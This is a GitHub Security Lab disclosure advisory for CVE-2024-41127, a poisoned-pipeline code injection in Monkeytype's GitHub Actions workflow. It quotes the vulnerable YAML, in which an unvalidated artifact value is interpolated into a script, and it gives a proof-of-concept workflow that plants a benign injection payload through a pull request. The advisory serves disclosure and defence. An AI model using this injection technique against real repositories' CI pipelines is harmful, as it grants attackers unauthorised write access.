
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

August 1, 2024
# GHSL-2024-167: Poisoned Pipeline Execution through Code Injection in Monkeytype - CVE-2024-41127

[![Author avatar](https://avatars.githubusercontent.com/u/125701)
Alvaro Munoz](https://github.com/pwntester)

## Coordinated Disclosure Timeline

* 2024-07-17: Reported through GitHub’s Private Vulnerability Reporting (PVR).
* 2024-07-20: Fixed by [PR](https://github.com/monkeytypegame/monkeytype/pull/5632).

## Summary

Monkeytype is vulnerable to Poisoned Pipeline Execution through Code Injection in its `ci-failure-comment.yml` GitHub Workflow, enabling attackers to gain `pull-requests` write access.

## Project

monkeytype

## Tested Version

Latest commit at the time of reporting

## Details

### Code Injection in `ci-failure-comment.yml` (`GHSL-2024-167`)

The [`ci-failure-comment.yml` workflow](https://github.com/monkeytypegame/monkeytype/blob/1838816bff756453290d558ba913ef907cd3dae6/.github/workflows/ci-failure-comment.yml) is triggered when the `Monkey CI` workflow completes:

```
on:
  workflow_run:
    workflows: [Monkey CI]
    types: [completed]

```

When it runs, it will download an artifact uploaded by the triggering workflow and assign the contents of `./pr_num/pr_num.txt` artifact to the `steps.pr_num_reader.outputs.content` WorkFlow variable:

```
- name: Download workflow artifact
  uses: dawidd6/action-download-artifact@v2.11.0
  with:
    github_token: ${{ secrets.GITHUB_TOKEN }}
    workflow: peek_icons.yml
    run_id: ${{ github.event.workflow_run.id }}

- name: Read the pr_num file
  id: pr_num_reader
  uses: juliangruber/read-file-action@v1.0.0
  with:
    path: ./pr_num/pr_num.txt

```

It is not validated that the variable is actually a number and later it is interpolated into a JS script allowing an attacker to change the code to be executed:

```
- name: Create comment
  uses: actions/github-script@v6
  with:
    github-token: ${{ secrets.API_TOKEN }}
    script: |
      github.rest.issues.createComment({
        issue_number: ${{ steps.pr_num_reader.outputs.content }},
        owner: context.repo.owner,
        repo: context.repo.repo,
         body: 'Continuous integration check(s) failed. Please review the failing check\'s logs and make the necessary changes. ' + context.payload.workflow_run.html_url
      })

```
#### Proof Of Concept

* Fork the repo.
* Create a new branch.
* Modify the contents of `.github/workflows/monkey-ci.yml` to:

```
name: Monkey CI

on:
  pull_request:

jobs:
  exploit:
    permissions: write-all
    runs-on: ubuntu-latest
    steps:
      - name: Write exploit to artifact
        shell: bash
        run: echo '`${console.log('PWNED')}`' > pr_num.txt

      - name: Upload the exploit
        uses: actions/upload-artifact@v3
        with:
          name: pr_num
          path: ./pr_num.txt

```

* Create a Pull request with this change to the master branch of monkeytype.
* The modified workflow will trigger and will upload an artifact with the exploit which will trigger the second workflow which will download it and interpolate it into the JS script.

#### Impact

This issue leads to [`pull-requests` write access](https://github.com/monkeytypegame/monkeytype/actions/runs/9957625850/job/27510033064#step:1:18).

#### Resources

* [CodeQL for JavaScript - Expression injection in Actions](https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/)
* [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
* [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

## CVE

* CVE-2024-41127

## Resources

* https://github.com/monkeytypegame/monkeytype/security/advisories/GHSA-wcjf-5464-4wq9

## Credit

This issue was discovered and reported by GHSL team member [@pwntester (Alvaro Muñoz)](https://github.com/pwntester).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-167` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

